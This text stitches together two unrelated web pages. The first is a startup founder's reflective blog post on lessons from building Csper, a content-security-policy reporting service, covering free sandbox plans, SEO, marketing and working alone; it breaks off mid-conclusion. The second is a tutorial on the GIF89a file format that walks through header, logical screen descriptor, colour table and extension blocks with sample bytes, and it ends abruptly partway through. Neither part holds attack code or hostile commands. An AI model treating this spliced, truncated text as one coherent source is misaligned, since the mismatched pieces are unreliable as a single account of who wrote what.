<p>A lot of this may sound complain-y, they’re definitely first world problems. But they are things I wish I had fully internalized.</p>
<h2 id="nobody-cares">Nobody cares</h2>
<p>It sounds very negative, and I don’t mean it in a bad way. But I think it applies to many aspects of building the startup.</p>
<p>People want a tool that solves the problem. No one cares about the effort involved in creating little features. No one cares about the story, no one cares how it works. They just want to be re-assured it will work, so they can focus on their 1000 other problems.</p>
<p>There’s nothing wrong with that, it’s just important to remember.</p>
<p>The fact that no one cares also has positive aspects! I was worried about my two hours of planned downtime when I was doing a large migration. Literally no one cared. I think my startup could have been down for a few days, and no one would of cared that much. Unfortunately or fortunately I focused a lot on reliability (which was kind of wasted effort now that I realize it).</p>
<h2 id="careful-with-free-trials">Careful with free trials</h2>
<p>I thought it would be cool if I had a free sandbox plan. Let people kick the tires. When they see the amazing value they’ll upgrade!</p>
<p>Not so much.</p>
<p>The free sandbox offering attracted over 1000 businesses. Super neat! The only problem was… no one upgraded to paying plans. So I’m supporting 1000 customers on my platform. Goodbye life savings (kidding, but it does cost non-trivial money).</p>
<p>I don’t want to dive into the specifics of content-security-policy report-uri, but having a sandbox account created weird dynamics/incentives. My startup focuses on making this specific security tool easier. And I charge based on “usage” of the feature. But by making this security tool easier, there was less need for usage. So every feature I included made the Sandbox account a better solution, no need to upgrade for more usage.</p>
<p>So I had 1000+ people using the platform, and they had no incentive to upgrade. And every feature I released solidified that SANDBOX was all your need. I could of limited key features, but I hate it when other companies do that, and it wasn’t obvious to me what features to limit. It also feels dis-honest. Instead I’d rather focus on making the best product. So instead I went with a free trial period and made the choice to discontinue SANDBOX accounts. (If you were a sandbox user of Csper, against I apologize, but it had to be done).</p>
<p>There’s way less usage, but now people pay for the service. And I’m not fronting the bill for &gt;1000 customers (which I can not do for long since i’m self bootstrapped).</p>
<h2 id="seo--pipeline--ads">SEO / Pipeline / Ads</h2>
<p>It sounds so obvious now, but wasn’t fully fully internalized when I started.</p>
<p>People aren’t just going to “stumble” onto your product.</p>
<p>When Csper was released, I made sure it could handle a lot of load. I was worried that it would spread like wildfire. So I made sure everything could scale. Autoscaling k8s, autoscaling database. I setup observability on everything to debug issues, tracing, logging, monitoring dashboards, etc.</p>
<p>Long story short, almost no one showed up.</p>
<p>SEO / Marketing are the name of the game. (not an endorsement), but getting setup with SEM rush to track my SEO (specifically content marketing).</p>
<h2 id="people-like-open-source-a-lot">People like “open source”… a lot</h2>
<p>I built a similar open source product about 5-6 years ago. It’s crazy how fast people will refer an open source product compared to a paid product.</p>
<p>It’s a huge marketing advantage I never really considered. The product today is SIGNIFICANTLY better than the 5-6 year old product, yet people still share links to my old defunct product.</p>
<p>“open source” seems to trump reliability. I’m probably the same way, so I can’t complain too much. Just interesting to watch it happen.</p>
<p>I was very tempted to shift to “open source” and then have a paid plan. But, never did.</p>
<h2 id="on-the-plus-working-for-yourself-is-amazing">On the plus, working for yourself is… amazing</h2>
<p>I loved all my previous jobs. For better or worse, work is usually the center of my life.</p>
<p>But, there’s something about waking up in the morning, making yourself some coffee, and pouring your heart into something you own. For awhile I would shoot out of bed at 6am (without an alarm) because I was so excited to get to work. I’d work for 12 hours, and then do it all again, and I was excited about it.</p>
<p>And it’s so nice knowing where everything is. At some point I had to do a decent sized migration across 125 files. Knowing how everything works and where it is makes every project nice and fun. No hidden side effects.</p>
<h2 id="delayed-reward">Delayed reward</h2>
<p>More of a psychological thing. But it’s hard to remove the feeling of working hard and getting a reward.</p>
<p>I did two large migrations on Csper. One was a re-write of “projects” and “organizations” to consolidate billing and other stuff. It was like 4500 lines of code over 125 files. Then doing all the data base migrations and testing… It was a lot of work to make sure it all worked correctly. And it was a bit stressful.</p>
<p>After the release went smoothly, it was a hurah! But, it’s not like I would instantly get any new customers.</p>
<p>After the migration is done, I’m still just staring at my computer, nothing has changed.</p>
<p>Being generous, let’s say the different of consolidated billings increased conversions by 5%, I’d have to wait awhile to see that impact. I don’t think I even got a new customer that week.</p>
<p>It can be dis-heartening when you work super hard, but then nothing happens. It was a mental barrier to separate that.</p>
<h2 id="its-a-bit-of-a-rollercoaster">It’s a bit of a rollercoaster</h2>
<p>It seems like when things go bad, a lot of things go bad at once. A customer will leave, the firefox extension store will remove my addon, some feature will be acting up, and your competitors just signed a big deal.</p>
<p>That emotional buffer is important. I should have remembered to leave some room in my emotional tank to take hits. Wearing thin and then taking a couple of hits is not fun.</p>
<p>In the movies/books/interwebs every startup is successful. When you see people working hard, it’s like “no duh, the payoff and reward will be huge!” But in real life you have to face that most likely it will fail. When do you cut your losses? When you take a number of hits at once, those questions go to the front of your mind.</p>
<h2 id="lonely">Lonely</h2>
<p>Probably the biggest downside to this adventure so far is not working on a team. I miss is celebrating wins. Giving yourself a high five when a customer signs up is cool, but experiences are better shared with someone.</p>
<p>My girlfriend and I recently worked out a system where I get a twinkie when I get a new customer. Which is very nice. We celebrate the wins, but there’s something about a group working towards a goal and achieving that goal.</p>
<h2 id="bug-fixes-are-meh">Bug Fixes are… meh</h2>
<p>Previously as an engineer I would hate publishing bugs in my code. Where’s the attention to craft!</p>
<p>But now being honest about my todo list, most bugs don’t matter <em>that</em> much. The chance of defering a customer from paying because of a bug here and there is pretty small. (I mean, it depends on the bug, and you should try super hard not to have bugs. It’s no excuse for being sloppy).</p>
<p>But, I have a bug tracker pretty full of little bugs here and there. But when I assign dollar values to them, SEO/marketing is almost always more important than fixing a bug.</p>
<p>If an article attracts two new customers, and a weird edge case defers one customer, by the numbers it’s better to focus on the article. When you’re a non-bootstrapped solo startup, you have to run towards the money. You also can’t make everyone happy.</p>
<h2 id="others">Others</h2>
<p>Some things that I already knew, and thankful that I did:</p>
<ul>
<li>Staging/prod. Staging saved my butt a number of times. And made things way less stressful when doing big changes. Worth every penny.</li>
<li>k8s on gke was pretty nice. it took a day or two to get my infra setup, and then I never really thought about it. it just scales here and there.</li>
<li>Single command deploys, and lots of makefiles. Any command that could be useful later I store in a makefile. i never want to think about things.</li>
</ul>
<p>Things that were surprisingly frustrating:</p>
<ul>
<li>Browser extension review processes!
<ul>
<li>Chrome takes weeks and weeks to review extensions</li>
<li>Firefox is super picky about making sure that they can compile your code and it exactly matches what’s in the app store</li>
</ul>
</li>
<li>SaaS trails/charges. You rely on a number of services for your startup, and they start to add up. Some companies are also very sneaky about not emailing you before they charge your credit card. There was one company that charged me for 6 months without sending a single email.
<ul>
<li>I should of been reviewing my credit card statements, but when you’re already working long days, it’s near the bottom of the chopping block. At the end of the day, writing another article for SEO is more important than checking a hypothetical</li>
</ul>
</li>
<li>Kind of weird point, but I tried advertising on linkedin/google/facebook/twitter. I left with a very negative view of all the platforms and try very hard not to read from them anymore. Everyone knows that those platforms are about advertising, but it wasn’t until I was trying to shove my agenda down other peoples throats did I realize how disgusting it was. Now I see all the other businesses doing what I was doing, pushing their own agenda. I want no part of anyone else’s agenda. I was probably doing ads wrong, but I saw no drop in signups after I stopped them. I’m going to fully focus on SEO instead. I feel good about that, when people have a problem, they’ll google for it, and my company will be there.</li>
</ul>
<h2 id="conclusion">Conclusion</h2>
<p>Overall, building Csper has been a interesting experience. Maybe …</p></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
	<p>
	We sill start off by walking though the different parts of a GIF file.
	(The information on this page is primarily drawn from the
	<a href="http://www.w3.org/Graphics/GIF/spec-gif89a.txt">W3C GIF89a specification</a>.)
	A GIF file is made up of a bunch of different "blocks" of data. The following diagram
	shows all of the different types of blocks and where they belong in the file. The file starts
	at the left and works it's way right. At each branch you may go one way or the other. The
	large "middle" section can be repeated as many times as needed. (Technically, it may
	also be omitted completely but i can't imagine what good a GIF file with no image data
	would be.)
	</p>
	<p><img src="http://matthewflickinger.com/lab/whatsinagif/images/gif_file_stream.gif" alt="GIF file stream diagram" width="700" height="220"></p>
	<p>
	I'll show you what these blocks looks like by walking through a sample
	GIF file. You can see the sample file and its corresponding bytes below.
	</p>
	

	<p>
	Note that not all blocks are represented in this sample file. I will provide samples of missing
	blocks where appropriate.
	The different types of blocks include:
		<a href="#header_block">header</a>,
		<a href="#logical_screen_descriptor_block">logical screen descriptor</a>,
		<a href="#global_color_table_block">global color table</a>,
		<a href="#graphics_control_extension_block">graphics control extension</a>,
		<a href="#image_descriptor_block">image descriptor</a>,
		<a href="#local_color_table_block">local color table</a>,
		<a href="#image_data_block">image data</a>,
		<a href="#plain_text_extension_block">plain text extension</a>,
		<a href="#application_extension_block">application extension</a>,
		<a href="#comment_extension_block">comment extension</a>,
		and <a href="#trailer_block">trailer</a>.
	Let's get started with the first block!
	</p>

	<h2><a name="header_block">Header Block</a></h2>
	<p>From Sample File: </p>
	<p>
	All GIF files must start with a header block. The header takes up the first
	six bytes of the file. These bytes should all correspond to
	<a href="http://www.ascii.cl/">ASCII character codes</a>. We actually have two pieces
	of information here. The first three bytes are called the <strong>signature</strong>.
	These should always be "GIF" (ie 47="G", 49="I", 46="F"). The next three specify the
	<strong>version</strong> of the specification that was used to encode the image. We'll only be working
	with "89a" (ie 38="8", 39="9", 61="a"). The only other recognized version string
	is "87a" but i doubt most people will run into those anymore.

	<h2><a name="logical_screen_descriptor_block">Logical Screen Descriptor</a></h2>
	<p>From Sample File: <span> 0A </span><span> 00 </span><span> 0A </span><span> 00 </span><span> 91 </span><span> 00 </span><span> 00 </span></p>
	<p>
	The logical screen descriptor always immediately follows the header. This block
	tells the decoder how much room this image will take up. It is exactly
	seven bytes long. It starts with the <strong>canvas width</strong>. This value
	can be found in the first two bytes. It's saved in a format called the spec
	simply calls <em>unsigned</em>. Basically we're looking at a 16-bit, nonnegative
	integer (0-65,535). As with all the other multi-byte values in the GIF format, the least
	significant byte is stored first (little-endian format). This means where we would read
	<span> 0A </span><span> 00 </span>
	from the byte stream, we would normally write it as <span>000A</span> which is
	the same as 10. Thus the width of our sample image is 10 pixels. As a further example
	255 would be stored as <span> FF </span><span> 00 </span> but 256 would be <span> 00 </span><span> 01 </span>.
	As you might expect, the <strong>canvas height</strong> follows. Again, in this sample we
	can see this value is <span> 0A </span><span> 00 </span> which is 10.
	</p>
	<p>
	Next we have a <em>packed byte</em>. That means that this byte actually has multiple values
	stored in its bits. In this case, the byte <span> 91 </span> can be represented
	as the binary number <span>10010001</span>. (The built in Windows calculator
	is actually very useful when converting numbers into hexadecimal and binary formats. Be sure
	it's in "scientific" or "programmer" mode, depending on the version of
	windows you have.) The first (most-significant) bit is the <strong>global color
	table flag</strong>. If it's 0, then there is none. If it's 1, then a global color table will
	follow. In our sample image, we can see that we will have a global color table (as will usually
	be the case).  The next three bits represent the <strong>color resolution</strong>. The spec
	says this value " is the number of bits per primary color available to the original image,
	minus 1" and "...represents the size of the entire palette from which the colors in the
	graphic were selected." Because i don't much about what this one does, I'll point you to
	a more knowledgeable article on <a href="http://www.devx.com/projectcool/Article/19997/0/page/7">bit and color depth</a>.
	For now 1 seems to work. Note that <span>001</span> represents 2 bits/pixel;
	<span>111</span> would represent 8 bits/pixel.
	The next single bit is the <strong>sort flag</strong>. If the values is 1, then the
	colors in the global color table are sorted in order of "decreasing importance," which
	typically means "decreasing frequency" in the image. This can help the image decoder but
	is not required. Our value has been left at 0. The last three bits are the <strong>
	size of global color table</strong>. Well, that's a lie; it's not the actual size of the
	table. If this value is N, then the actual table size is 2^(N+1). From our sample
	file, we get the three bits <span>001</span> which is the binary version of 1.
	Our actual table size would be 2^(1+1) = 2^2 = 4. (We've mentioned the global color table
	several times with this byte, we will be talking about what it is in the next section.)
	</p>
	<p>
	The next byte gives us the <strong>background color index</strong>. This byte is only meaningful
	if the global color table flag is 1. It represents which color in the global color table
	(by specifying its index) should be used for pixels whose value is not specified in the
	image data. If, by some chance, there is no global color table, this byte should be 0.
	</p>
	<p>
	The last byte of the logical screen descriptor is the <strong>pixel aspect ratio</strong>.
	I'm not exactly sure what this value does. Most of the images I've seen have this value
	set to 0. The spec says that if there was a value specified in this byte, N, the actual
	ratio used would be (N + 15) / 64 for all N&lt;&gt;0.

	<h2><a name="global_color_table_block">Global Color Table</a></h2>
	<p>From Sample File: <span> FF </span><span> FF </span><span> FF </span><span> FF </span><span> 00 </span><span> 00 </span><span> 00 </span><span> 00 </span><span> FF </span><span> 00 </span><span> 00 </span><span> 00 </span></p>
	<p>
	We've mentioned the <strong>global color table</strong> a few times already now lets talk
	about what it actually is. As you are probably already aware, each GIF has its own color
	palette. That is, it has a list of all the colors that can be in the image and cannot
	contain colors that are not in that list. The global color table is where that list
	of colors is stored. Each color is stored in three bytes. Each of the bytes represents
	an RGB color value. The first byte is the value for red (0-255), next green, then blue.
	The size of the global color table is determined by the value in the packed byte of the
	logical screen descriptor. As we mentioned before, if the value from that byte is N, then
	the actual number of colors stored is 2^(N+1). This means that the global color table will
	take up 3*2^(N+1) bytes in the stream.
	</p>

	<div>
	<table id="global_color_size">
	<tbody><tr><th>Size In Logical<br>Screen Desc</th><th>Number Of<br>Colors</th><th>Byte<br>Length</th></tr>
	<tr><td>0</td><td>2</td><td>6</td></tr>
	<tr><td>1</td><td>4</td><td>12</td></tr>
	<tr><td>2</td><td>8</td><td>24</td></tr>
	<tr><td>3</td><td>16</td><td>48</td></tr>
	<tr><td>4</td><td>32</td><td>96</td></tr>
	<tr><td>5</td><td>64</td><td>192</td></tr>
	<tr><td>6</td><td>128</td><td>384</td></tr>
	<tr><td>7</td><td>256</td><td>768</td></tr>
	</tbody></table>
	</div>

	<p>
	Or sample file has a global color table size of 1. This means it holds 2^(1+1)=2^2=4 colors.
	We can see that it takes up 12, (3*4), bytes as expected. We read the bytes three at a time to get
	each of the colors. The first color is #FFFFFF (white). This value is given an index of 0.
	The second color is #FF0000 (red). The color with an index value of 2 is #0000FF (blue).
	The last color is #000000 (black). The index numbers will be important when we decode
	the actual image data.
	</p>
	<p>
	Note that this block is labeled as "optional." Not every GIF has to specify a global
	color table. However, if the global color table flag is set to 1 in the logical
	screen descriptor block, the color table is then required to immediately follow that
	block.

	<h2><a name="graphics_control_extension_block">Graphics Control Extension</a></h2>
	<p>From Sample File: <span> 21 </span><span> F9 </span><span> 04 </span><span> 00 </span><span> 00 </span><span> 00 </span><span> 00 </span><span> 00 </span></p>
	<p>
	Graphic control extension blocks are used frequently to
	specify transparency settings and control animations. They are completely optional.
	Since transparency and animations are bit complicated, I will hold off on many of
	the details of this block until a later section
	(see <a href="http://matthewflickinger.com/lab/whatsinagif/animation_and_transparency.asp">Transparency and Animation</a>).
	In the interest of this page being complete, I will at least tell you what
	the bytes represent.
	</p>
	<p>
	The first byte is the <strong>extension introducer</strong>. All <em>extension</em>
	blocks begin with <span>21</span>. Next is the <strong>graphic
	control label</strong>, <span>F9</span>, which is the value that
	says this is a graphic control extension. Third up is the total <strong>block
	size</strong> in bytes. Next is a packed field. Bits 1-3 are reserved for future
	use. Bits 4-6 indicate <strong>disposal method</strong>. The penult bit is
	the <strong>user input flag</strong> and the last is the <strong>transparent color
	flag</strong>. The <strong>delay time</strong> value follows in the next two bytes
	stored in the unsigned format. After that we have the <strong>transparent color
	index</strong> byte. Finally we have the <strong>block terminator</strong> which
	is always <span>00</span>.

	<h2><a name="image_descriptor_block">Image Descriptor</a></h2>
	<p>From Sample File: <span> 2C </span><span> 00 </span><span> 00 </span><span> 00 </span><span> 00 </span><span> 0A </span><span> 00 </span><span> 0A </span><span> 00 </span><span> 00 </span></p>
	<p>
	A single GIF file may contain multiple images (useful when creating animated
	images). Each image begins with an image descriptor block. This block is exactly
	10 bytes long.
	</p>
	<p>
	The first byte is the <strong>image separator</strong>. Every image
	descriptor begins with the value <span>2C</span>. The next 8 bytes
	represent the location and size of the following image. An image in
	the stream may not necessarily take up the entire canvas size defined by
	the logical screen descriptor. Therefore, the image descriptor specifies
	the <strong>image left position</strong> and <strong>image top position</strong> of
	where the image should begin on the canvas. Next it specifies the
	<strong>image width</strong> and <strong>image height</strong>. Each of these
	values is in the two-byte, unsigned format. Our sample image indicates that
	the image starts at (0,0) and is 10 pixels wide by 10 pixels tall. (This image
	does take up the whole canvas size.)
	</p>
	<p>
	The last byte is another packed field. In our sample file this byte is 0 so
	all of the sub-values will be zero. The first (most significant) bit in
	the byte is the <strong>local color table flag</strong>. Setting this flag
	to 1 allows you to specify that the image data that follows uses a different
	color table than the global color table. (More information on the local
	color table follows.) The second bit is the <strong>interlace flag</strong>.

	<h2><a name="local_color_table_block">Local Color Table</a></h2>
	<p>
	The local color table looks identical to the global color table. The local
	color table would always immediately follow an image descriptor but will only
	be there if the local color table flag is set to 1. It is effective only for the
	block of image data that immediately follows it. If no local color table
	is specified, the global color table is …</p></div></div>
